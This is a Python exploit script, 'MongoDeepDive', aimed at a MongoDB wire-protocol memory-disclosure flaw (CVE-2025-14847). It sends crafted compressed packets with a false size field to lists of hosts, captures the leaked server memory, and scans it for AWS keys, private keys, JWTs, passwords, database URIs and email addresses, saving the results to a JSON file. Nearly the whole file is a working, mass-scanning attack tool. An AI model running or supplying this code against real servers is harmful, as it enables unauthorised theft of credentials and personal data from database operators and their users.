#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
MongoDeepDive
─────────────
Author: Tunahan Tekeoğlu
Target: MongoDB Wire Protocol Vulnerability (CVE-2025-14847)
"""

import asyncio
import struct
import zlib
import re
import math
import argparse
import json
import sys
import os
from datetime import datetime
from collections import Counter
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, MofNCompleteColumn
from rich.panel import Panel

console = Console()

# --- Configuration ---
DEFAULT_LEAK_SIZE = 65536  # 64KB chunks to allocate
OP_COMPRESSED = 2012

# --- Intelligence Engine ---
class MemoryIntelligence:
    @staticmethod
    def calculate_shannon_entropy(data: bytes) -> float:
        if not data: return 0.0
        entropy = 0
        length = len(data)
        counts = Counter(data)
        for count in counts.values():
            p_x = count / length
            if p_x > 0:
                entropy -= p_x * math.log2(p_x)
        return entropy

    @staticmethod
    def classify_data(data: bytes):
        entropy = MemoryIntelligence.calculate_shannon_entropy(data)
        classification = "UNKNOWN"
        confidence = "LOW"
        findings = []
        
        # Entropy Thresholds
        if entropy > 4.5:
            classification = "HIGH_ENTROPY (Key/Encrypted)"
            confidence = "HIGH"
        elif 3.5 < entropy <= 4.5:
            classification = "COMPLEX_TEXT/CODE"
            confidence = "MEDIUM"
        else:
            classification = "LOW_ENTROPY (Padding/Logs)"
            confidence = "LOW"

        # Regex Patterns
        decoded = data.decode('utf-8', errors='ignore')
        patterns = {
            "AWS_KEY": r"AKIA[0-9A-Z]{16}",
            "PRIVATE_KEY": r"-----BEGIN .* PRIVATE KEY-----",
            "JWT_TOKEN": r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}",
            "PASSWORD": r"(?i)(password|passwd|pwd|secret)\s*[:=]\s*[\"'](.*?)[\"']",
            "DB_URI": r"mongodb(\+srv)?://",
            "EMAIL": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
        }

        for label, pattern in patterns.items():
            matches = re.findall(pattern, decoded)
            if matches:
                unique_matches = list(set([m if isinstance(m, str) else m[0] for m in matches]))
                findings.extend([f"{label}: {m[:30]}..." for m in unique_matches])
                classification = f"SECRET_EXPOSED ({label})"
                confidence = "CRITICAL"

        return entropy, classification, confidence, findings

    @staticmethod
    def clean_memory_dump(raw_data: bytes) -> list:
        # Split chunks to find islands of data (removes null bytes)
        chunks = [chk for chk in re.split(b'[\x00-\x1F\x7F]{4,}', raw_data) if len(chk) > 16]
        return chunks

# --- Exploit Core ---
class MongoScanner:
    def __init__(self, timeout, safety_mode):
        self.timeout = timeout
        self.safety_mode = safety_mode

    def build_packet(self):
        bson_payload = b'\x13\x00\x00\x00\x10isMaster\x00\x01\x00\x00\x00\x00'
        op_query = struct.pack('<I', 0) + b'admin.$cmd\x00' + struct.pack('<ii', 0, -1)
        original_msg = op_query + bson_payload
        compressed_body = zlib.compress(original_msg)

        op_compressed = (
            struct.pack('<I', OP_COMPRESSED) + 
            struct.pack('<I', DEFAULT_LEAK_SIZE) + 
            b'\x02' + 
            compressed_body
        )
        header = struct.pack('<iiii', 16 + len(op_compressed), 1337, 0, OP_COMPRESSED)
        return header + op_compressed

    async def scan_host(self, host, port, packet_count):
        host_results = []
        is_vulnerable = False
        max_response_len = 0 # Track the biggest leak size
        
        for i in range(packet_count):
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port), timeout=self.timeout
                )
                
                writer.write(self.build_packet())
                await writer.drain()

                header = await asyncio.wait_for(reader.readexactly(16), timeout=self.timeout)
                resp_len, _, _, _ = struct.unpack('<iiii', header)

                # DETECTION LOGIC
                if resp_len > 1024:
                    is_vulnerable = True
                    max_response_len = max(max_response_len, resp_len) 
                    
                    body = await reader.readexactly(resp_len - 16)
                    try:
                        leaked_data = zlib.decompress(body)
                    except:
                        leaked_data = body

                    chunks = MemoryIntelligence.clean_memory_dump(leaked_data)
                    for chunk in chunks:
                        entropy, cls, conf, findings = MemoryIntelligence.classify_data(chunk)
                        if conf in ["MEDIUM", "HIGH", "CRITICAL"]:
                            host_results.append({
                                "packet_id": i,
                                "entropy": round(entropy, 3),
                                "classification": cls,
                                "confidence": conf,
                                "findings": findings,
                                "preview": chunk.decode('utf-8', errors='ignore')[:80]
                            })

                writer.close()
                await writer.wait_closed()
                if self.safety_mode: await asyncio.sleep(0.5)

            except Exception:
                pass 
        
        return is_vulnerable, max_response_len, host_results

# --- Orchestrator ---
async def worker(sem, scanner, host, port, count, progress, task_id, all_data):
    async with sem:
        is_vuln, resp_size, findings = await scanner.scan_host(host, port, count)
        
        if is_vuln:
            # REPORT BYTE SIZE IMMEDIATELY (Scanner Mode)
            console.print(f"[bold green][+] VULNERABLE: {host}:{port} | Response Size: {resp_size} bytes[/bold green]")
            
            # REPORT CONTENT INTELLIGENCE (Deep Dive Mode)
            high_conf = [f for f in findings if f['confidence'] in ['HIGH', 'CRITICAL']]
            if high_conf:
                console.print(f"    [bold red]└── SECRETS FOUND:[/bold red] {len(high_conf)} critical blocks extracted")
                for item in high_conf[:2]: 
                    console.print(f"       [yellow]➜ {item['classification']}[/yellow]")
            else:
                console.print(f"    [dim]└── Leak confirmed, but memory content is currently empty/low-entropy.[/dim]")
            
            if findings:
                all_data[f"{host}:{port}"] = findings
                
        progress.advance(task_id)

async def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="Single target IP")
    parser.add_argument("-l", "--list", help="Target list file")
    parser.add_argument("-p", "--port", type=int, default=27017)
    parser.add_argument("-c", "--concurrency", type=int, default=20)
    parser.add_argument("-n", "--count", type=int, default=5, help="Number of packets per host")
    parser.add_argument("--timeout", type=int, default=5)
    parser.add_argument("--safe", action="store_true")
    parser.add_argument("-o", "--output", default="mongo_audit.json")
    args = parser.parse_args()

    targets = []
    if args.target: targets.append(args.target)
    if args.list and os.path.exists(args.list):
        with open(args.list, 'r') as f: targets.extend([l.strip() for l in f if l.strip()])

    if not targets:
        print("Please provide -t target or -l list.txt")
        sys.exit(1)

    console.rule("[bold blue]MongoDeepDive - Tunahan Tekeoğlu[/bold blue]")
    
    scanner = MongoScanner(args.timeout, args.safe)
    sem = asyncio.Semaphore(args.concurrency)
    all_data = {}

    with Progress(
        SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
        BarColumn(), MofNCompleteColumn(), console=console
    ) as progress:
        task = progress.add_task("[cyan]Scanning...", total=len(targets))
        coroutines = []
        for t in targets:
            # Handle IP:PORT in list
            if ":" in t:
                host, port_str = t.split(":")
                port_val = int(port_str)
            else:
                host, port_val = t, args.port
                
            coroutines.append(worker(sem, scanner, host, port_val, args.count, progress, task, all_data))
        await asyncio.gather(*coroutines)

    if all_data:
        with open(args.output, 'w') as f: json.dump(all_data, f, indent=4)
        console.print(f"\n[green]Report saved to {args.output}[/green]")

if __name__ == "__main__":
    try: asyncio.run(main())
    except KeyboardInterrupt: pass
